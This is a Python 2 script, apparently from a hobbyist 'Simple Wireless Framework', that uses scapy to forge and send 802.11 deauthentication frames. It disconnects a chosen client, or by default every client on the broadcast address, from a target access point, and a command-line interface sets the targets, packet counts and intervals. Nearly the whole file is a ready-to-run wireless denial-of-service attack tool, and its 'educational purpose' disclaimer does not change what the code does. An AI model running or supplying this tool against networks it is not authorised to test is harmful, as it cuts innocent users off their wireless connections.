#!/usr/bin/python

from scapy.all import *
import time
import sys
import optparse


"""
===============================================================
++++++++++++++++++++++++ READ ME ++++++++++++++++++++++++++++++
===============================================================

This Script Is Part Of 

		+++++++++++++++++++++++++++++++++++++
			Simple Wireless Framework
		+++++++++++++++++++++++++++++++++++++



Author :

    	Suraj Singh
    	Admin
    	S.S.B Group
    	surajsinghbisht054@gmail.com
    	www.bitforestinfo.com


    	Note: We Feel Proud To Be Indian


This Script Created Only For Practise And Educational Purpose Only
The Author Will Not Take Any Responsibility Of Any illegal Activity.


"""
# =================Other Configuration================ 
# Usages :
usage = "usage: %prog [options] [AP_Mac_Address] [Interface_Name] "
# Version
Version="%prog 0.0.1"
# ====================================================

# Required Data Feild
Feild = {
# Key      Value  Required
'count'      : (5,    False) ,
'iface'      : (None, True),  
'ap'         : (None, True),
'client'     : (None, False), 
'side'		 : ('ap', False),
'interval'   : (0.5,  False),
'deauth'	 : (1, 	  False) 
}



# Wireless Deauth Main Class
class WirelessDeauth:
	"""

	WirelessDeauth Class 
		Allow Us To Send Wireless Deauth Packets Using scapy Module

	"""
	def __init__(self, *args, **kwargs):
		self.args = args
		self.kwargs = kwargs
		self.start_process()

	def start_process(self):
		"""
		Main Trigger Function

		"""
		self.assign_variables()
		
		# Creating Packets 
		side = self.kwargs.pop("side")
		self.deauth_packets(side=side)
		
		# Usable Variables
		ap = self.kwargs.pop("ap")
		client = self.kwargs.pop("client")
		interval = self.kwargs.pop("interval")
		deauth = self.kwargs.pop("deauth")

		# Run Packet Sender
		self.packet_sender(deauth, interval)
		return


	def packet_sender(self, deauth, interval):
		"""
		Function For Sending Packets
		"""
		for i in range(deauth):
			for pkt in self.ready_packets:
				sendp(pkt,**self.kwargs)
				time.sleep(interval)
		return



	def deauth_packets(self, side='ap'):
		"""
		Creating Deauth Packet Creator

		side :
			client 		: Target Client
			ap 			: Target Station
			both 		: Target Both

		"""

		if side=="client":

			pkt = RadioTap()/Dot11(addr1=self.kwargs['ap'], addr2=self.kwargs['client'], addr3=self.kwargs['client'])/Dot11Deauth()
			self.ready_packets.append(pkt)
		
		elif side=="ap":
			pkt = RadioTap()/Dot11(addr1=self.kwargs['client'], addr2=self.kwargs['ap'], addr3=self.kwargs['ap'])/Dot11Deauth()
			self.ready_packets.append(pkt)

		else:
			pkt = RadioTap()/Dot11(addr1=self.kwargs['ap'], addr2=self.kwargs['client'], addr3=self.kwargs['client'])/Dot11Deauth()
			self.ready_packets.append(pkt)
			pkt = RadioTap()/Dot11(addr1=self.kwargs['client'], addr2=self.kwargs['ap'], addr3=self.kwargs['ap'])/Dot11Deauth()
			self.ready_packets.append(pkt)

		return


	def assign_variables(self):
		"""
		Function For Assign Various Variables
		"""

		if "client" not in self.kwargs.keys():
			# default value Of client keyword
			self.kwargs['client']="FF:FF:FF:FF:FF:FF"

		if "count" not in self.kwargs.keys():
			# default value of count keyword
			self.kwargs['count']=5


		if "side" not in self.kwargs.keys():
			# default value of count keyword
			self.kwargs['side']='ap'

		if "interval" not in self.kwargs.keys():
			# Default Value Of Interval
			self.kwargs['interval']=0.5

		if "deauth" not in self.kwargs.keys():
			# Default Value Of Deauth
			self.kwargs['deauth']=1

		self.ready_packets=[]
		return


if __name__=="__main__":
	parser = optparse.OptionParser(usage, version=Version)
	parser.add_option("-a", "--accesspoint", action="store", type="string", dest="ap", help="Please Specify Access Point MAC Address.", default=None)
	parser.add_option("-c", "--client", action="store", type="string", dest="client", help="Please Specify Client MAC Address " , default = "FF:FF:FF:FF:FF:FF")
	parser.add_option("-t", "--count", action="store", type="int", dest="count", help="Please Specify Packet Numbers" , default=5)
	parser.add_option("-i", "--interval", action="store", type="float", dest="interval", help="Please Specify Interval Time" , default=0.5)
	parser.add_option("-d", "--deauth", action="store", type="int", dest="deauth", help="Please Specify Deauth Packets " , default=2)
	parser.add_option("-s", "--side", action="store", type="string", dest="side", help="Specify Target For Packet Sending : \nap = Access Point (default);\nclient = Client ;\n both = Access Point And CLient ;")

	(option, args)=parser.parse_args()
	if not args or not option.ap:
		print " [*] Please Provide Required Inputs Or Use -h Or --help argument."
		sys.exit(0)
	kw = {
	# Key      Value  Required
	'count'      : option.count,
	'iface'      : args[0],  
	'ap'         : option.ap,
	'client'     : option.client, 
	'side'	     : option.side,
	'interval'   : option.interval,
	'deauth'     : option.deauth, 
	}
	WirelessDeauth(**kw)	
#WirelessDeauth(iface="mon0", ap="FF:FF:FF:FF:FF:FF", client="FF:FF:FF:FF:FF:FF", side="both")

